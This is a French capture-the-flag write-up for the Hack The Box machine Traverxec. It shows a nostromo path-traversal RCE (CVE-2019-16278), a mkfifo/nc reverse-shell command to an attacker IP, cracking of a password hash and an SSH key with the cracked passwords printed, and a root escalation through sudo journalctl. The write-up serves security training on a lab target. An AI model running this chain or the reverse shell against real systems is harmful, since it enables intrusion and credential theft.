# Infos

Level : Easy  
OS : Linux  
IP : 10.129.24.71  
Hostname: traverxec

# Reconnaissance

## Nmap TCP base

```
nmap -T4 --min-rate 10000 -sV -oN nmap_base 10.129.24.71 -v

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On est sur l'OS Linux, sur le port 80, on retrouve la version de nostromo 1.9.6 qui peut être intéressant pour la suite.

# Enumération

## Port 80/tcp - HTTP

Sur le site, on retrouve une page web statique. Si on se renseigne sur  [nostromo](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=NHTTPD), on peut voir qu'il s'agit d'un serveur web très minimaliste.

![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/80-site.png)

En bas de la page, on a un formulaire, mais il ne fonctionne pas

![](https://github.com/0xLuks/htb-writeup/blob/main/traverxec/img/80-form-disabled)

## Foothold - www-data

Pas de robots.txt, on commence par fuzz les répertoires et fichiers, mais ça ne donne rien. Si on recherche des exploits en lien avec la version de nostromo, on retrouve un [exploit](https://www.exploit-db.com/exploits/47837) concernant la [CVE-2019-16278](https://nvd.nist.gov/vuln/detail/CVE-2019-16278) permettrant un path traversal dans la fonction `http_verify`, cela mène à une RCE.

L'exploit semble un peu vieux, on va en chercher un autre. Rapidement, on trouve cet [exploit](https://raw.githubusercontent.com/jas502n/CVE-2019-16278/master/CVE-2019-16278.sh) en bash sur Github. Cela nous demande l'hôte comme premier argument, puis le port en second argument et enfin la commande que l'on souhaite.

![[80-rce.png]]

Ca fonctionne et on obtient bien une RCE. Essayons maintenant d'obtenir un reverse shell Bash TCP, ça ne fonctionne pas, mais si on essaye avec le reverse shell mkfifo ça passe et on récupère un shell en tant que www-data

`bash CVE-2019-16278.sh 10.129.24.71 80 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.33 9001 >/tmp/f"`

![[shell-www-data.png]]

## Mouvement latéral - david

Sur la machine, on retrouve deux utilisateurs, david qui pourrait être notre pivot et le compte root.

Lancement de linpeas, on peut voir un kernel un peut vieux

`OS: Linux version 4.19.0-6-amd64 (debian-kernel@lists.debian.org) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20)`

Variables d'env

![[www-data-peas-env.png]]

Crontab

`-rw-r--r-- 1 root root    1042 Jun 23  2019 /etc/crontab`

.htpasswd

![[www-data-peas-htpasswd.png]]

`david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/`

On peut tenter de cracker ce hash et ça fonctionne `Nowonly4me`, mais impossible d'utiliser ce mot de passe via su ou SSH

`john --format=md5crypt hash-md5-david.txt --wordlist=/opt/rockyou.txt`

![[lat-crack-hash.png]]

Dans le répertoire contenant le server web nostromo, on retrouve un fichier de conf `nhttpd.conf` qui nous permet de voir qu'il y a un dossier accessible `public_www` sous `/home/david/public_www`

![[lat-conf-nostromo.png]]

Quand on y accède on retrouve un fichier et un dossier :
- index.html
- protected-file-area -> folder

Dans ce dossier on retrouve également deux fichiers :
- .htaccess -> ne donne rien
- backup-ssh-identity-files.tgz -> archive d'un backup SSH -> juicy :p

![[lat-david-tgz.png]]

On ne peut pas décompresser l'archive sur la target, mais on peut essayer de le transférer sur la machine d'attaque. Ca ne fonctionne pas, on peut tenter de copier le fichier dans /tmp, lui assigner les droits et le décompresser

![[tmp-backup-ssh.png]]

Ca fonctionne et on retrouve sa clé privée RSA chiffrée sous `/tmp/home/david/.ssh/id_rsa`

![[lat-david_idrsa_crypt.png]]

Utilisation de ssh2john pour générer un hash

`/opt/tools/john/run/ssh2john.py id_rsa_david > id_rsa_david_hash`

![[lat-david-idrsa_hash.png]]

Crack avec JtR, on retrouve le mdp `hunter`

`john id_rsa_david_hash --wordlist=/opt/rockyou.txt`

![[lat-david-idrsa_crack.png]]

Tentative de connexion en SSH et récupération du flag user.txt

`ssh -i id_rsa_david david@10.129.24.71`

![[Hack The Box/traverxec/img/userflag.png]]

## Elévation de privilèges - root

Lancement de linpeas pour trouver un path pour le root, sous `/home/david/bin/` on retrouve le fichier `server-stats.sh` qui fait appel à la commande sudo, ce qui pourrait être intéressant pour obtenir le compte root.

Si on l'exécute, on obtient ceci

`./server-stats.sh`

![[pe-server-stats.png]]

La dernière ligne fait appel à sudo sur journalctl, cela va ouvrir un less, on peut privesc de cette manière `!/bin/bash`

`/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service`

Après plusieurs tentatives, il faut deux terminaux pour que ça fonctionne, en effet si on tente avec un seul, le pager less ne se lance pas.

![[pe-suid-error.png]]

Alors qu'avec deux terminaux, ça fonctionne :D

![[rootflag.png]]


